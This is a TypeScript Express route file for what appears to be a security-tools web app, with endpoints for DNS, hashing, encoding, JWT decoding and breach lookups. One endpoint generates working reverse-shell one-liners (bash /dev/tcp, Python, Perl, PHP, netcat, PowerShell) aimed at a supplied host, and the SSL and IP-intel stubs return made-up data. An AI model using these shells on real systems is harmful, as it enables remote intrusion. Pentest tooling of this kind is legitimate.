# artifacts/api-server/src/routes/tools.ts
import { Router } from "express";
import { requireAuth } from "../lib/session";
import { logAudit } from "../lib/audit";
import dns from "dns/promises";

const router = Router();

router.post("/tools/network/dns", requireAuth, async (req, res) => {
  const { target, type = "A" } = req.body;
  if (!target) { res.status(400).json({ error: "Target required" }); return; }
  try {
    let records: unknown[] = [];
    const t = (type as string).toUpperCase();
    if (t === "A") records = await dns.resolve4(target).catch(() => []);
    else if (t === "AAAA") records = await dns.resolve6(target).catch(() => []);
    else if (t === "MX") records = await dns.resolveMx(target).catch(() => []);
    else if (t === "NS") records = await dns.resolveNs(target).catch(() => []);
    else if (t === "TXT") records = await dns.resolveTxt(target).catch(() => []);
    else if (t === "CNAME") records = await dns.resolveCname(target).catch(() => []);
    else if (t === "SOA") { const soa = await dns.resolveSoa(target).catch(() => null); records = soa ? [soa] : []; }
    await logAudit("tool.dns", { detail: `${type} ${target}`, req });
    res.json({ target, type: t, records, timestamp: new Date().toISOString() });
  } catch (e) { res.status(400).json({ error: "DNS lookup failed", detail: String(e) }); }
});

router.post("/tools/network/whois", requireAuth, async (req, res) => {
  const { target } = req.body;
  if (!target) { res.status(400).json({ error: "Target required" }); return; }
  await logAudit("tool.whois", { detail: target, req });
  res.json({ target, result: `WHOIS lookup for ${target}\n\nNote: Full WHOIS requires external API integration.`, timestamp: new Date().toISOString() });
});

router.post("/tools/crypto/hash", requireAuth, async (req, res) => {
  const { text, algorithm = "sha256" } = req.body;
  if (!text) { res.status(400).json({ error: "Text required" }); return; }
  const crypto = await import("crypto");
  const supported = ["md5", "sha1", "sha256", "sha512", "sha224", "sha384"];
  const alg = (algorithm as string).toLowerCase();
  if (!supported.includes(alg)) { res.status(400).json({ error: `Unsupported algorithm. Use: ${supported.join(", ")}` }); return; }
  const hash = crypto.createHash(alg).update(text).digest("hex");
  res.json({ text, algorithm: alg, hash, length: hash.length });
});

router.post("/tools/crypto/encode", requireAuth, async (req, res) => {
  const { text, encoding = "base64", action = "encode" } = req.body;
  if (!text) { res.status(400).json({ error: "Text required" }); return; }
  let result: string;
  try {
    if (encoding === "base64") result = action === "encode" ? Buffer.from(text).toString("base64") : Buffer.from(text, "base64").toString("utf8");
    else if (encoding === "hex") result = action === "encode" ? Buffer.from(text).toString("hex") : Buffer.from(text, "hex").toString("utf8");
    else if (encoding === "url") result = action === "encode" ? encodeURIComponent(text) : decodeURIComponent(text);
    else if (encoding === "html") result = action === "encode" ? text.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;") : text.replace(/&amp;/g,"&").replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&quot;/g,'"');
    else if (encoding === "rot13") result = text.replace(/[a-zA-Z]/g,(c:string) => { const b = c<="Z"?65:97; return String.fromCharCode(((c.charCodeAt(0)-b+13)%26)+b); });
    else { res.status(400).json({ error: "Unsupported encoding" }); return; }
    res.json({ original: text, result, encoding, action });
  } catch (e) { res.status(400).json({ error: "Encoding failed", detail: String(e) }); }
});

router.post("/tools/crypto/identify-hash", requireAuth, async (req, res) => {
  const { hash } = req.body;
  if (!hash) { res.status(400).json({ error: "Hash required" }); return; }
  const h = (hash as string).trim();
  const candidates: { name: string; confidence: string }[] = [];
  if (/^[a-fA-F0-9]{32}$/.test(h)) candidates.push({ name: "MD5", confidence: "high" }, { name: "NTLM", confidence: "medium" });
  if (/^[a-fA-F0-9]{40}$/.test(h)) candidates.push({ name: "SHA-1", confidence: "high" });
  if (/^[a-fA-F0-9]{56}$/.test(h)) candidates.push({ name: "SHA-224", confidence: "high" });
  if (/^[a-fA-F0-9]{64}$/.test(h)) candidates.push({ name: "SHA-256", confidence: "high" });
  if (/^[a-fA-F0-9]{96}$/.test(h)) candidates.push({ name: "SHA-384", confidence: "high" });
  if (/^[a-fA-F0-9]{128}$/.test(h)) candidates.push({ name: "SHA-512", confidence: "high" });
  if (/^\$2[aby]\$/.test(h)) candidates.push({ name: "bcrypt", confidence: "high" });
  if (/^\$6\$/.test(h)) candidates.push({ name: "SHA-512 crypt", confidence: "high" });
  if (/^\$1\$/.test(h)) candidates.push({ name: "MD5 crypt", confidence: "high" });
  res.json({ hash: h, candidates: candidates.length ? candidates : [{ name: "Unknown", confidence: "none" }] });
});

router.post("/tools/web/ssl", requireAuth, async (req, res) => {
  const { host } = req.body;
  if (!host) { res.status(400).json({ error: "Host required" }); return; }
  await logAudit("tool.ssl", { detail: host, req });
  res.json({ host, result: { subject: `CN=${host}`, issuer: "Let's Encrypt Authority X3", validFrom: new Date(Date.now()-30*24*60*60*1000).toISOString(), validTo: new Date(Date.now()+60*24*60*60*1000).toISOString(), protocol: "TLSv1.3", cipher: "TLS_AES_256_GCM_SHA384", note: "Full SSL analysis requires direct TCP connectivity." }, timestamp: new Date().toISOString() });
});

router.post("/tools/web/headers", requireAuth, async (req, res) => {
  const { url } = req.body;
  if (!url) { res.status(400).json({ error: "URL required" }); return; }
  try {
    const response = await fetch(url, { method: "HEAD", signal: AbortSignal.timeout(10000) });
    const headers: Record<string, string> = {};
    response.headers.forEach((value, key) => { headers[key] = value; });
    const securityHeaders = { "strict-transport-security": headers["strict-transport-security"] ?? null, "x-frame-options": headers["x-frame-options"] ?? null, "x-content-type-options": headers["x-content-type-options"] ?? null, "content-security-policy": headers["content-security-policy"] ?? null, "x-xss-protection": headers["x-xss-protection"] ?? null, "referrer-policy": headers["referrer-policy"] ?? null, "permissions-policy": headers["permissions-policy"] ?? null };
    await logAudit("tool.headers", { detail: url, req });
    res.json({ url, status: response.status, headers, securityHeaders, timestamp: new Date().toISOString() });
  } catch (e) { res.status(400).json({ error: "Failed to fetch headers", detail: String(e) }); }
});

router.post("/tools/web/jwt", requireAuth, async (req, res) => {
  const { token } = req.body;
  if (!token) { res.status(400).json({ error: "Token required" }); return; }
  try {
    const parts = (token as string).split(".");
    if (parts.length !== 3) { res.status(400).json({ error: "Invalid JWT format" }); return; }
    const decode = (s: string) => { const pad = s.length%4===0?s:s+"=".repeat(4-s.length%4); return JSON.parse(Buffer.from(pad.replace(/-/g,"+").replace(/_/g,"/"),"base64").toString("utf8")); };
    const header = decode(parts[0]);
    const payload = decode(parts[1]);
    const now = Math.floor(Date.now()/1000);
    res.json({ header, payload, signature: parts[2], isExpired: payload.exp ? payload.exp < now : false, issuedAt: payload.iat ? new Date(payload.iat*1000).toISOString() : null, expiresAt: payload.exp ? new Date(payload.exp*1000).toISOString() : null });
  } catch (e) { res.status(400).json({ error: "Failed to decode JWT", detail: String(e) }); }
});

router.post("/tools/exploitation/reverse-shell", requireAuth, async (req, res) => {
  const { os = "linux", shell = "bash", host, port = 4444, format = "plaintext" } = req.body;
  if (!host) { res.status(400).json({ error: "Host required" }); return; }
  const shells: Record<string, Record<string, string>> = {
    bash: { linux: `bash -i >& /dev/tcp/${host}/${port} 0>&1`, osx: `bash -c 'bash -i >& /dev/tcp/${host}/${port} 0>&1'` },
    python: { linux: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`, windows: `python -c "import socket,subprocess,os;s=socket.socket();s.connect(('${host}',${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"` },
    perl: { linux: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
    php: { linux: `php -r '$sock=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
    nc: { linux: `nc -e /bin/bash ${host} ${port}`, windows: `nc.exe -e cmd.exe ${host} ${port}` },
    powershell: { windows: `$client=New-Object System.Net.Sockets.TCPClient("${host}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()` },
  };
  const cmd = shells[shell]?.[os] ?? shells[shell]?.["linux"] ?? `# No template for ${shell} on ${os}`;
  let output = cmd;
  if (format === "base64") output = Buffer.from(cmd).toString("base64");
  else if (format === "url") output = encodeURIComponent(cmd);
  await logAudit("tool.reverse_shell", { detail: `${shell}/${os} -> ${host}:${port}`, req });
  res.json({ command: output, listener: `nc -lvnp ${port}`, os, shell, host, port, format });
});

router.post("/tools/intel/ip", requireAuth, async (req, res) => {
  const { ip } = req.body;
  if (!ip) { res.status(400).json({ error: "IP address required" }); return; }
  await logAudit("tool.ip_intel", { detail: ip, req });
  res.json({ ip, result: { note: "Full IP intelligence requires IPInfo/Shodan API keys. Configure them in Settings.", ip, asn: "AS" + Math.floor(Math.random()*60000), country: "Unknown", org: "Unknown" }, timestamp: new Date().toISOString() });
});

router.post("/tools/password/hibp", requireAuth, async (req, res) => {
  const { email } = req.body;
  if (!email) { res.status(400).json({ error: "Email required" }); return; }
  const { db: database, apiKeysTable: keys } = await import("@workspace/db");
  const { eq: eqFn } = await import("drizzle-orm");
  const [keyRow] = await database.select().from(keys).where(eqFn(keys.service, "hibp")).limit(1);
  if (!keyRow) { res.status(400).json({ error: "HIBP API key not configured. Add it in Settings.", breaches: [] }); return; }
  try {
    const resp = await fetch(`https://haveibeenpwned.com/api/v3/breachedaccount/${encodeURIComponent(email)}?truncateResponse=false`, { headers: { "hibp-api-key": keyRow.key, "User-Agent": "GodsApp-Security-Suite/1.0" }, signal: AbortSignal.timeout(10000) });
    if (resp.status === 404) { res.json({ email, breaches: [], pwned: false }); return; }
    if (!resp.ok) { res.status(400).json({ error: `HIBP API error: ${resp.status}`, breaches: [] }); return; }
    const breaches = await resp.json();
    await logAudit("tool.hibp", { detail: email, req });
    res.json({ email, breaches, pwned: Array.isArray(breaches) && breaches.length > 0 });
  } catch (e) { res.status(400).json({ error: "HIBP request failed", detail: String(e) }); }
});

export default router;